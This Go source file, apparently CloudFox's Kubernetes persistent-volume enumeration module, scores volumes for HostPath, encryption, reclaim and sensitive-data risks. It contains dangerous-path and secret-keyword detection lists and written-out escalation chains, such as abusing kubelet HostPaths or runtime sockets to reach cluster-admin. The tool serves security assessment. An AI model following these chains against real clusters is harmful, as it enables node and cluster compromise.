package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	storagev1 "k8s.io/api/storage/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var PersistentVolumesCmd = &cobra.Command{
	Use:     "persistent-volumes",
	Aliases: []string{"pv", "pvs", "pvc", "pvcs", "volumes"},
	Short:   "Enumerate PersistentVolumes and PersistentVolumeClaims with security analysis",
	Long: `
Enumerate all PersistentVolumes and PersistentVolumeClaims including:
  - Storage classes and provisioners
  - Access modes and capacity
  - Mount paths and bound pods
  - Cloud provider volume IDs
  - Reclaim policies
  - Security analysis (HostPath risks, encryption, sensitive data, privilege escalation)

  cloudfox kubernetes persistent-volumes`,
	Run: ListPersistentVolumes,
}

type PersistentVolumesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (p PersistentVolumesOutput) TableFiles() []internal.TableFile {
	return p.Table
}

func (p PersistentVolumesOutput) LootFiles() []internal.LootFile {
	return p.Loot
}

// PersistentVolumeFinding represents comprehensive security analysis for a volume
type PersistentVolumeFinding struct {
	// Basic Info
	PVName        string
	PVCName       string
	PVCNamespace  string
	Capacity      string
	StorageClass  string
	VolumeType    string
	CloudVolumeID string
	Provisioner   string
	Status        string

	// Security Analysis
	RiskLevel           string
	SecurityIssues      []string
	HostPathRisk        string
	DataSensitivityRisk string

	// HostPath Analysis (CRITICAL)
	IsHostPath          bool
	HostPathPath        string
	HostPathType        string
	AllowsHostRoot      bool
	AllowsEtcAccess     bool
	AllowsVarRunAccess  bool
	AllowsKubeletAccess bool
	HostPathEscalation  []string

	// Access Mode Security
	AccessModes         []string
	AllowsReadWriteMany bool
	MultiPodAccessRisk  string

	// Reclaim Policy
	ReclaimPolicy   string
	DataLeakageRisk string

	// Encryption & Security
	IsEncrypted         bool
	EncryptionType      string
	UnencryptedDataRisk string

	// Sensitive Data Detection
	SensitivePathPatterns []string
	ContainsDatabaseData  bool
	ContainsSecretData    bool
	ContainsConfigData    bool
	SensitiveDataType     string

	// Cloud Provider Security
	CloudProvider   string
	SnapshotEnabled bool

	// CSI Security
	CSIDriver         string
	CSIVolumeHandle   string
	CSISecurityIssues []string

	// Network Storage (NFS, iSCSI)
	IsNetworkStorage   bool
	NFSServer          string
	NFSPath            string
	NFSReadOnly        bool
	NetworkStorageRisk string

	// Usage Analysis
	BoundPods       []string
	BoundPodCount   int
	BoundNamespaces []string
	UnusedVolume    bool
	OrphanedVolume  bool

	// Mount Security
	MountedReadOnly     bool
	MountPaths          []string
	SensitiveMountPaths []string

	// Age
	Age               string
	CreationTimestamp string

	// Privilege Escalation
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string

	// Data Exfiltration
	AllowsDataExfiltration bool
	ExfiltrationScenarios  []string

	// Attack Scenarios
	AttackPaths     []string
	Recommendations []string
}

// HostPathAnalysis represents security analysis for HostPath volumes
type HostPathAnalysis struct {
	IsHostPath          bool
	Path                string
	Type                string
	RiskLevel           string
	DangerousPath       bool
	DangerousPathReason string
	EscalationPaths     []string
	SecurityIssues      []string
}

// SensitiveDataAnalysis represents detection of sensitive data in volumes
type SensitiveDataAnalysis struct {
	ContainsSensitiveData bool
	DataType              string
	Patterns              []string
	RiskLevel             string
	SecurityIssues        []string
}

// EncryptionAnalysis represents encryption security analysis
type EncryptionAnalysis struct {
	IsEncrypted    bool
	Provider       string
	EncryptionType string
	KMSKeyID       string
	RiskLevel      string
	SecurityIssues []string
}

// ReclaimPolicyAnalysis represents reclaim policy security analysis
type ReclaimPolicyAnalysis struct {
	Policy          string
	DataLeakageRisk bool
	RiskLevel       string
	Issues          []string
}

// AccessModeAnalysis represents access mode security analysis
type AccessModeAnalysis struct {
	Modes               []corev1.PersistentVolumeAccessMode
	AllowsReadWriteMany bool
	BoundPodCount       int
	RiskLevel           string
	Issues              []string
}

// NFSSecurityAnalysis represents NFS volume security analysis
type NFSSecurityAnalysis struct {
	Server    string
	Path      string
	ReadOnly  bool
	NoAuth    bool
	RiskLevel string
	Issues    []string
}

// CSISecurityAnalysis represents CSI driver security analysis
type CSISecurityAnalysis struct {
	Driver             string
	VolumeHandle       string
	Attributes         map[string]string
	IsEncrypted        bool
	KnownVulnerability string
	RiskLevel          string
	SecurityIssues     []string
}

// StorageClassAnalysis represents storage class security analysis
type StorageClassAnalysis struct {
	Name                   string
	Provisioner            string
	VolumeBindingMode      string
	AllowVolumeExpansion   bool
	ReclaimPolicy          string
	Parameters             map[string]string
	AllowsHostPath         bool
	AllowsPrivilegedAccess bool
	RequiresEncryption     bool
	SecurityIssues         []string
	RiskLevel              string
}

// VolumeSnapshotFinding represents volume snapshot security analysis
type VolumeSnapshotFinding struct {
	Name             string
	Namespace        string
	SourcePVC        string
	SnapshotClass    string
	ReadyToUse       bool
	CreationTime     string
	SourceSensitive  bool
	ExfiltrationRisk string
	SecurityIssues   []string
	AttackScenarios  []string
}

func ListPersistentVolumes(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating persistent volumes for %s", globals.ClusterName), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Get all PersistentVolumes
	pvs, err := clientset.CoreV1().PersistentVolumes().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing persistent volumes: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
		return
	}

	// Get all namespaces for PVC enumeration
	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
		return
	}

	// Get all storage classes
	storageClasses, err := clientset.StorageV1().StorageClasses().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing storage classes: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
	}

	// Storage class map for quick lookup
	scMap := make(map[string]storagev1.StorageClass)
	if storageClasses != nil {
		for _, sc := range storageClasses.Items {
			scMap[sc.Name] = sc
		}
	}

	headers := []string{
		"Risk Level",
		"PV Name",
		"PVC",
		"Namespace",
		"Capacity",
		"Volume Type",
		"HostPath Risk",
		"Encryption",
		"Sensitive Data",
		"Access Modes",
		"Bound Pods",
		"Reclaim Policy",
		"Storage Class",
		"Orphaned",
		"Escalation Paths",
		"Security Issues",
		"Age",
		"Recommendations",
	}

	var outputRows [][]string
	var findings []PersistentVolumeFinding

	// Loot file contents
	var lootEnum []string
	var lootHostPath []string
	var lootEscalation []string
	var lootUnencrypted []string
	var lootExfiltration []string
	var lootNetworkStorage []string
	var lootReclaimPolicy []string
	var lootReadWriteMany []string
	var lootOrphaned []string
	var lootCloudAccess []string
	var lootDataAccess []string
	var lootSnapshots []string
	var lootAttackPaths []string
	var lootMisconfigurations []string
	var lootRemediation []string

	// Initialize loot headers
	lootEnum = append(lootEnum, `#####################################
##### PersistentVolume Enumeration
#####################################
#
# Enumerate storage resources
#
`)

	lootHostPath = append(lootHostPath, `#####################################
##### HostPath Volume Security
#####################################
#
# CRITICAL: HostPath volumes provide direct host filesystem access
# These are the #1 container escape vector
#
# IMPACT: Full node compromise, cluster takeover
#
`)

	lootEscalation = append(lootEscalation, `#####################################
##### Privilege Escalation via Storage
#####################################
#
# Storage-based privilege escalation paths
# Complete attack chains from initial access to cluster compromise
#
`)

	lootUnencrypted = append(lootUnencrypted, `#####################################
##### Unencrypted Sensitive Data
#####################################
#
# Volumes containing sensitive data without encryption
# Risk: Data exposure if volume accessed or snapshots taken
#
`)

	lootExfiltration = append(lootExfiltration, `#####################################
##### Data Exfiltration via Snapshots
#####################################
#
# Snapshot-based data exfiltration techniques
# Create snapshots, restore to new PVC, exfiltrate data
#
`)

	lootNetworkStorage = append(lootNetworkStorage, `#####################################
##### Network Storage Security
#####################################
#
# NFS/iSCSI volumes with authentication issues
# Risk: Direct network access without Kubernetes RBAC
#
`)

	lootReclaimPolicy = append(lootReclaimPolicy, `#####################################
##### Reclaim Policy - Data Leakage Risk
#####################################
#
# Volumes with "Retain" policy persist after PVC deletion
# Risk: Previous tenant data may be accessible
#
`)

	lootReadWriteMany = append(lootReadWriteMany, `#####################################
##### ReadWriteMany Shared Volumes
#####################################
#
# Volumes shared across multiple pods
# Risk: Lateral movement, data corruption, race conditions
#
`)

	lootOrphaned = append(lootOrphaned, `#####################################
##### Orphaned and Unused Volumes
#####################################
#
# Released or unbound volumes that may contain old data
# Risk: Data leakage if reclaimed by another tenant
#
`)

	lootCloudAccess = append(lootCloudAccess, `#####################################
##### Cloud Volume Direct Access
#####################################
#
# Access cloud provider volumes directly (bypass Kubernetes)
# REQUIRES: Cloud provider CLI tools and credentials
#
`)

	lootDataAccess = append(lootDataAccess, `#####################################
##### Data Access via Inspector Pods
#####################################
#
# Access PVC data by creating temporary inspector pods
# MANUAL EXECUTION REQUIRED
#
`)

	lootSnapshots = append(lootSnapshots, `#####################################
##### Volume Snapshots
#####################################
#
# Enumerate VolumeSnapshots for data exfiltration assessment
# Snapshots can be used to copy sensitive data
#
`)

	lootAttackPaths = append(lootAttackPaths, `#####################################
##### Complete Attack Paths
#####################################
#
# End-to-end attack chains via persistent volumes
# From initial access to cluster compromise
#
`)

	lootMisconfigurations = append(lootMisconfigurations, `#####################################
##### Storage Misconfigurations
#####################################
#
# Security misconfigurations in storage resources
#
`)

	lootRemediation = append(lootRemediation, `#####################################
##### Remediation Recommendations
#####################################
#
# Security hardening recommendations for storage
#
`)

	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.ClusterName))
	}

	// Map to track which pods use which PVCs
	pvcToPods := make(map[string][]string)
	pvcToPodsNamespaces := make(map[string][]string)

	// Get all pods across all namespaces to map PVC usage
	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, pod := range pods.Items {
				for _, volume := range pod.Spec.Volumes {
					if volume.PersistentVolumeClaim != nil {
						key := fmt.Sprintf("%s/%s", ns.Name, volume.PersistentVolumeClaim.ClaimName)
						pvcToPods[key] = append(pvcToPods[key], pod.Name)
						pvcToPodsNamespaces[key] = append(pvcToPodsNamespaces[key], ns.Name)
					}
				}
			}
		}
	}

	// Process PersistentVolumes
	for _, pv := range pvs.Items {
		finding := PersistentVolumeFinding{
			PVName: pv.Name,
			Status: string(pv.Status.Phase),
		}

		// Basic attributes
		if storage, ok := pv.Spec.Capacity[corev1.ResourceStorage]; ok {
			finding.Capacity = storage.String()
		} else {
			finding.Capacity = "<NONE>"
		}

		// Access modes
		for _, mode := range pv.Spec.AccessModes {
			finding.AccessModes = append(finding.AccessModes, string(mode))
			if mode == corev1.ReadWriteMany {
				finding.AllowsReadWriteMany = true
			}
		}

		// Claim
		if pv.Spec.ClaimRef != nil {
			finding.PVCName = pv.Spec.ClaimRef.Name
			finding.PVCNamespace = pv.Spec.ClaimRef.Namespace
		}

		// Storage class
		if pv.Spec.StorageClassName != "" {
			finding.StorageClass = pv.Spec.StorageClassName
		} else {
			finding.StorageClass = "<NONE>"
		}

		// Reclaim policy
		finding.ReclaimPolicy = string(pv.Spec.PersistentVolumeReclaimPolicy)

		// Age
		age := time.Since(pv.CreationTimestamp.Time)
		finding.Age = persistentVolumesFormatDuration(age)
		finding.CreationTimestamp = pv.CreationTimestamp.Format(time.RFC3339)

		// Detect volume type and cloud provider volume ID
		finding.VolumeType, finding.CloudVolumeID, finding.Provisioner = detectVolumeSource(pv.Spec.PersistentVolumeSource)

		// Get bound pods
		if finding.PVCNamespace != "" && finding.PVCName != "" {
			key := fmt.Sprintf("%s/%s", finding.PVCNamespace, finding.PVCName)
			finding.BoundPods = pvcToPods[key]
			finding.BoundPodCount = len(finding.BoundPods)
			finding.BoundNamespaces = k8sinternal.Unique(pvcToPodsNamespaces[key])
		}

		// HostPath Security Analysis
		hostPathAnalysis := analyzeHostPathSecurity(pv)
		finding.IsHostPath = hostPathAnalysis.IsHostPath
		finding.HostPathPath = hostPathAnalysis.Path
		finding.HostPathType = hostPathAnalysis.Type
		finding.AllowsHostRoot = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.DangerousPathReason, "host filesystem")
		finding.AllowsEtcAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/etc")
		finding.AllowsVarRunAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/var/run")
		finding.AllowsKubeletAccess = hostPathAnalysis.DangerousPath && strings.Contains(hostPathAnalysis.Path, "/var/lib/kubelet")
		finding.HostPathEscalation = hostPathAnalysis.EscalationPaths
		finding.SecurityIssues = append(finding.SecurityIssues, hostPathAnalysis.SecurityIssues...)
		if hostPathAnalysis.IsHostPath {
			finding.HostPathRisk = hostPathAnalysis.RiskLevel
		} else {
			finding.HostPathRisk = "None"
		}

		// Sensitive Data Detection
		sensitiveDataAnalysis := detectSensitiveData(pv, finding.PVCName, finding.StorageClass)
		finding.ContainsDatabaseData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Database")
		finding.ContainsSecretData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Secret")
		finding.ContainsConfigData = sensitiveDataAnalysis.ContainsSensitiveData && strings.Contains(sensitiveDataAnalysis.DataType, "Config")
		finding.SensitiveDataType = sensitiveDataAnalysis.DataType
		finding.SensitivePathPatterns = sensitiveDataAnalysis.Patterns
		finding.SecurityIssues = append(finding.SecurityIssues, sensitiveDataAnalysis.SecurityIssues...)
		if sensitiveDataAnalysis.ContainsSensitiveData {
			finding.DataSensitivityRisk = sensitiveDataAnalysis.RiskLevel
		}

		// Encryption Analysis
		encryptionAnalysis := analyzeEncryption(pv)
		finding.IsEncrypted = encryptionAnalysis.IsEncrypted
		finding.EncryptionType = encryptionAnalysis.EncryptionType
		finding.CloudProvider = encryptionAnalysis.Provider
		finding.SecurityIssues = append(finding.SecurityIssues, encryptionAnalysis.SecurityIssues...)
		if !encryptionAnalysis.IsEncrypted && sensitiveDataAnalysis.ContainsSensitiveData {
			finding.UnencryptedDataRisk = "HIGH"
		}

		// Reclaim Policy Analysis
		reclaimAnalysis := analyzeReclaimPolicy(pv)
		finding.DataLeakageRisk = reclaimAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, reclaimAnalysis.Issues...)

		// Access Mode Analysis
		accessModeAnalysis := analyzeAccessModes(pv, finding.BoundPods)
		finding.MultiPodAccessRisk = accessModeAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, accessModeAnalysis.Issues...)

		// Network Storage Analysis
		nfsAnalysis := analyzeNFSSecurity(pv)
		finding.IsNetworkStorage = nfsAnalysis.Server != ""
		finding.NFSServer = nfsAnalysis.Server
		finding.NFSPath = nfsAnalysis.Path
		finding.NFSReadOnly = nfsAnalysis.ReadOnly
		finding.NetworkStorageRisk = nfsAnalysis.RiskLevel
		finding.SecurityIssues = append(finding.SecurityIssues, nfsAnalysis.Issues...)

		// CSI Security Analysis
		csiAnalysis := analyzeCSISecurity(pv)
		finding.CSIDriver = csiAnalysis.Driver
		finding.CSIVolumeHandle = csiAnalysis.VolumeHandle
		finding.CSISecurityIssues = csiAnalysis.SecurityIssues
		finding.SecurityIssues = append(finding.SecurityIssues, csiAnalysis.SecurityIssues...)

		// Storage Class Analysis
		if sc, exists := scMap[finding.StorageClass]; exists {
			scAnalysis := analyzeStorageClassSecurity(sc)
			finding.SecurityIssues = append(finding.SecurityIssues, scAnalysis.SecurityIssues...)
		}

		// Orphaned/Unused Volume Detection
		if pv.Status.Phase == corev1.VolumeReleased {
			finding.OrphanedVolume = true
			finding.SecurityIssues = append(finding.SecurityIssues,
				"Volume was released but not reclaimed - may contain previous tenant data")
		}
		if pv.Status.Phase == corev1.VolumeAvailable && pv.Spec.ClaimRef == nil {
			finding.UnusedVolume = true
			finding.SecurityIssues = append(finding.SecurityIssues,
				"Unbound volume available for claiming - check for old data")
		}

		// Privilege Escalation Detection
		escalationPaths := detectVolumeEscalationPaths(finding)
		finding.EscalationPaths = escalationPaths
		finding.AllowsPrivilegeEscalation = len(escalationPaths) > 0

		// Data Exfiltration Detection
		exfiltrationScenarios := detectExfiltrationScenarios(finding)
		finding.ExfiltrationScenarios = exfiltrationScenarios
		finding.AllowsDataExfiltration = len(exfiltrationScenarios) > 0

		// Attack Paths
		finding.AttackPaths = generateAttackPaths(finding)

		// Risk Scoring
		finding.RiskLevel, _ = calculateVolumeRiskScore(finding)

		// Recommendations
		finding.Recommendations = generateRecommendations(finding)

		findings = append(findings, finding)

		// Generate table row
		orphanedStr := "No"
		if finding.OrphanedVolume {
			orphanedStr = "Released"
		} else if finding.UnusedVolume {
			orphanedStr = "Unbound"
		}

		encryptionStr := "No"
		if finding.IsEncrypted {
			encryptionStr = "Yes"
		}

		pvcStr := "<NONE>"
		if finding.PVCName != "" {
			pvcStr = finding.PVCName
		}

		namespaceStr := "<NONE>"
		if finding.PVCNamespace != "" {
			namespaceStr = finding.PVCNamespace
		}

		sensitiveDataStr := "<NONE>"
		if finding.SensitiveDataType != "" {
			sensitiveDataStr = finding.SensitiveDataType
		}

		outputRows = append(outputRows, []string{
			finding.RiskLevel,
			finding.PVName,
			pvcStr,
			namespaceStr,
			finding.Capacity,
			finding.VolumeType,
			finding.HostPathRisk,
			encryptionStr,
			sensitiveDataStr,
			strings.Join(finding.AccessModes, ","),
			fmt.Sprintf("%d", finding.BoundPodCount),
			finding.ReclaimPolicy,
			finding.StorageClass,
			orphanedStr,
			fmt.Sprintf("%d", len(finding.EscalationPaths)),
			fmt.Sprintf("%d", len(finding.SecurityIssues)),
			finding.Age,
			fmt.Sprintf("%d", len(finding.Recommendations)),
		})

		// Generate loot content
		generateLootContent(&finding, &lootEnum, &lootHostPath, &lootEscalation, &lootUnencrypted,
			&lootExfiltration, &lootNetworkStorage, &lootReclaimPolicy, &lootReadWriteMany,
			&lootOrphaned, &lootCloudAccess, &lootDataAccess, &lootAttackPaths,
			&lootMisconfigurations, &lootRemediation)
	}

	// Enumerate volume snapshots
	generateSnapshotLoot(ctx, clientset, &lootSnapshots)

	// Sort by risk level
	sort.SliceStable(outputRows, func(i, j int) bool {
		riskOrder := map[string]int{"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
		return riskOrder[outputRows[i][0]] < riskOrder[outputRows[j][0]]
	})

	table := internal.TableFile{
		Name:   "PersistentVolumes",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := []internal.LootFile{
		{
			Name:     "PV-PVC-Enum",
			Contents: strings.Join(lootEnum, "\n"),
		},
		{
			Name:     "PV-HostPath-Volumes",
			Contents: strings.Join(lootHostPath, "\n"),
		},
		{
			Name:     "PV-Privilege-Escalation",
			Contents: strings.Join(lootEscalation, "\n"),
		},
		{
			Name:     "PV-Unencrypted-Sensitive",
			Contents: strings.Join(lootUnencrypted, "\n"),
		},
		{
			Name:     "PV-Data-Exfiltration",
			Contents: strings.Join(lootExfiltration, "\n"),
		},
		{
			Name:     "PV-Network-Storage",
			Contents: strings.Join(lootNetworkStorage, "\n"),
		},
		{
			Name:     "PV-Reclaim-Policy",
			Contents: strings.Join(lootReclaimPolicy, "\n"),
		},
		{
			Name:     "PV-ReadWriteMany",
			Contents: strings.Join(lootReadWriteMany, "\n"),
		},
		{
			Name:     "PV-Orphaned-Volumes",
			Contents: strings.Join(lootOrphaned, "\n"),
		},
		{
			Name:     "PV-Cloud-Access",
			Contents: strings.Join(lootCloudAccess, "\n"),
		},
		{
			Name:     "PVC-Data-Access",
			Contents: strings.Join(lootDataAccess, "\n"),
		},
		{
			Name:     "PV-VolumeSnapshots",
			Contents: strings.Join(lootSnapshots, "\n"),
		},
		{
			Name:     "PV-Attack-Paths",
			Contents: strings.Join(lootAttackPaths, "\n"),
		},
		{
			Name:     "PV-Misconfigurations",
			Contents: strings.Join(lootMisconfigurations, "\n"),
		},
		{
			Name:     "PV-Remediation",
			Contents: strings.Join(lootRemediation, "\n"),
		},
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"PersistentVolumes",
		globals.ClusterName,
		"results",
		PersistentVolumesOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		criticalCount := 0
		highCount := 0
		for _, row := range outputRows {
			if row[0] == "CRITICAL" {
				criticalCount++
			} else if row[0] == "HIGH" {
				highCount++
			}
		}
		logger.InfoM(fmt.Sprintf("%d volumes found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
	} else {
		logger.InfoM("No persistent volumes found, skipping output file creation", globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME), globals.K8S_PERSISTENT_VOLUMES_MODULE_NAME)
}

// analyzeHostPathSecurity analyzes HostPath volume security
func analyzeHostPathSecurity(pv corev1.PersistentVolume) HostPathAnalysis {
	analysis := HostPathAnalysis{
		IsHostPath: false,
	}

	if pv.Spec.HostPath == nil {
		return analysis
	}

	analysis.IsHostPath = true
	analysis.Path = pv.Spec.HostPath.Path
	if pv.Spec.HostPath.Type != nil {
		analysis.Type = string(*pv.Spec.HostPath.Type)
	}
	analysis.RiskLevel = "HIGH"

	// Check dangerous paths
	dangerousPaths := map[string]string{
		"/":                         "CRITICAL - Full host filesystem access",
		"/etc":                      "CRITICAL - System configuration access",
		"/var/run/docker.sock":      "CRITICAL - Docker API access (container escape)",
		"/var/run/cri-dockerd.sock": "CRITICAL - CRI API access (container escape)",
		"/var/run/containerd":       "CRITICAL - Containerd socket access (container escape)",
		"/proc":                     "HIGH - Process introspection",
		"/sys":                      "HIGH - Kernel/system access",
		"/root":                     "HIGH - Root user home directory",
		"/var/lib/kubelet":          "CRITICAL - Kubelet secrets and certificates",
		"/var/lib/etcd":             "CRITICAL - etcd data (all cluster secrets)",
		"/var/log":                  "MEDIUM - System logs (may contain sensitive data)",
		"/home":                     "MEDIUM - User home directories",
		"/var/lib/docker":           "HIGH - Docker data directory",
		"/var/lib/containerd":       "HIGH - Containerd data directory",
		"/etc/kubernetes":           "CRITICAL - Kubernetes configuration and certificates",
		"/etc/cni":                  "MEDIUM - CNI configuration",
		"/opt/cni":                  "MEDIUM - CNI binaries",
	}

	for path, risk := range dangerousPaths {
		if strings.HasPrefix(analysis.Path, path) || analysis.Path == path {
			analysis.DangerousPath = true
			analysis.DangerousPathReason = risk
			if strings.Contains(risk, "CRITICAL") {
				analysis.RiskLevel = "CRITICAL"
			}
			break
		}
	}

	if analysis.DangerousPath {
		analysis.SecurityIssues = append(analysis.SecurityIssues, analysis.DangerousPathReason)
		analysis.EscalationPaths = append(analysis.EscalationPaths,
			fmt.Sprintf("HostPath mount: %s", analysis.Path),
			"Create PVC claiming this PV",
			"Create pod with this PVC mounted",
			"Access host filesystem from container",
			"Escalate to node root access",
		)

		if strings.HasPrefix(analysis.Path, "/var/lib/kubelet") {
			analysis.EscalationPaths = append(analysis.EscalationPaths,
				"Read kubelet kubeconfig and certificates",
				"Authenticate as node to API server",
				"Escalate to cluster-admin",
			)
		}

		if strings.Contains(analysis.Path, "docker.sock") || strings.Contains(analysis.Path, "containerd") {
			analysis.EscalationPaths = append(analysis.EscalationPaths,
				"Use container runtime socket to spawn privileged container",
				"Break out of container namespace",
				"Full node compromise",
			)
		}
	} else {
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			fmt.Sprintf("HostPath volume allows host access to: %s", analysis.Path))
	}

	return analysis
}

// detectSensitiveData detects if volume likely contains sensitive data
func detectSensitiveData(pv corev1.PersistentVolume, pvcName, storageClass string) SensitiveDataAnalysis {
	analysis := SensitiveDataAnalysis{
		ContainsSensitiveData: false,
		RiskLevel:             "LOW",
	}

	patterns := []struct {
		Pattern     string
		Type        string
		Severity    string
		Description string
	}{
		{"mysql", "Database", "HIGH", "MySQL database data"},
		{"postgres", "Database", "HIGH", "PostgreSQL database data"},
		{"mongodb", "Database", "HIGH", "MongoDB database data"},
		{"mariadb", "Database", "HIGH", "MariaDB database data"},
		{"redis", "Cache", "MEDIUM", "Redis cache (may contain session tokens)"},
		{"elasticsearch", "Search", "MEDIUM", "Elasticsearch indexed data"},
		{"backup", "Backup", "HIGH", "Backup data (may contain full system state)"},
		{"etcd", "Secrets", "CRITICAL", "etcd data (all cluster secrets)"},
		{"secret", "Secrets", "CRITICAL", "Likely contains secrets"},
		{"config", "Config", "MEDIUM", "Configuration files"},
		{"log", "Logs", "LOW", "Log files (may leak sensitive info)"},
		{"database", "Database", "HIGH", "Database storage"},
		{"db", "Database", "HIGH", "Database storage"},
		{"vault", "Secrets", "CRITICAL", "HashiCorp Vault data"},
		{"credential", "Secrets", "CRITICAL", "Credentials storage"},
		{"password", "Secrets", "CRITICAL", "Password storage"},
		{"ssh", "Credentials", "HIGH", "SSH keys"},
		{"ssl", "Certificates", "HIGH", "SSL/TLS certificates"},
		{"tls", "Certificates", "HIGH", "TLS certificates"},
		{"cert", "Certificates", "HIGH", "Certificates"},
		{"key", "Secrets", "HIGH", "Cryptographic keys"},
	}

	checkStrings := []string{
		strings.ToLower(pv.Name),
		strings.ToLower(pvcName),
		strings.ToLower(storageClass),
	}

	for _, pattern := range patterns {
		for _, str := range checkStrings {
			if strings.Contains(str, pattern.Pattern) {
				analysis.ContainsSensitiveData = true
				analysis.DataType = pattern.Type
				analysis.Patterns = append(analysis.Patterns, pattern.Pattern)
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					fmt.Sprintf("%s: %s", pattern.Type, pattern.Description))

				switch pattern.Severity {
				case "CRITICAL":
					analysis.RiskLevel = "CRITICAL"
				case "HIGH":
					if analysis.RiskLevel != "CRITICAL" {
						analysis.RiskLevel = "HIGH"
					}
				case "MEDIUM":
					if analysis.RiskLevel != "CRITICAL" && analysis.RiskLevel != "HIGH" {
						analysis.RiskLevel = "MEDIUM"
					}
				}
				break
			}
		}
	}

	return analysis
}

// analyzeEncryption detects encryption status
func analyzeEncryption(pv corev1.PersistentVolume) EncryptionAnalysis {
	analysis := EncryptionAnalysis{
		IsEncrypted: false,
		RiskLevel:   "MEDIUM",
	}

	// AWS EBS
	if pv.Spec.AWSElasticBlockStore != nil {
		analysis.Provider = "AWS EBS"
		// Note: Cannot determine encryption without AWS API call
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"AWS EBS - verify encryption with: aws ec2 describe-volumes --volume-ids "+pv.Spec.AWSElasticBlockStore.VolumeID)
	}

	// GCE PD
	if pv.Spec.GCEPersistentDisk != nil {
		analysis.Provider = "GCE PD"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"GCE PD - verify encryption with: gcloud compute disks describe "+pv.Spec.GCEPersistentDisk.PDName)
	}

	// Azure Disk
	if pv.Spec.AzureDisk != nil {
		analysis.Provider = "Azure Disk"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"Azure Disk - verify encryption with: az disk show --name "+pv.Spec.AzureDisk.DiskName)
	}

	// CSI
	if pv.Spec.CSI != nil {
		analysis.Provider = "CSI"
		if encrypted, ok := pv.Spec.CSI.VolumeAttributes["encrypted"]; ok && encrypted == "true" {
			analysis.IsEncrypted = true
			analysis.EncryptionType = "CSI Driver Encryption"
			analysis.RiskLevel = "LOW"
		}
		if key, ok := pv.Spec.CSI.VolumeAttributes["encryptionKMSKeyId"]; ok {
			analysis.IsEncrypted = true
			analysis.KMSKeyID = key
			analysis.EncryptionType = "KMS"
			analysis.RiskLevel = "LOW"
		}
		if !analysis.IsEncrypted {
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"CSI volume - encryption status unknown, check CSI driver configuration")
		}
	}

	// HostPath, NFS - never encrypted by default
	if pv.Spec.HostPath != nil {
		analysis.Provider = "HostPath"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"HostPath volumes are not encrypted (uses host filesystem)")
		analysis.RiskLevel = "HIGH"
	}

	if pv.Spec.NFS != nil {
		analysis.Provider = "NFS"
		analysis.SecurityIssues = append(analysis.SecurityIssues,
			"NFS volumes typically not encrypted in transit or at rest")
		analysis.RiskLevel = "HIGH"
	}

	return analysis
}

// analyzeReclaimPolicy analyzes reclaim policy security
func analyzeReclaimPolicy(pv corev1.PersistentVolume) ReclaimPolicyAnalysis {
	policy := string(pv.Spec.PersistentVolumeReclaimPolicy)

	analysis := ReclaimPolicyAnalysis{
		Policy:          policy,
		DataLeakageRisk: false,
		RiskLevel:       "LOW",
	}

	switch policy {
	case "Retain":
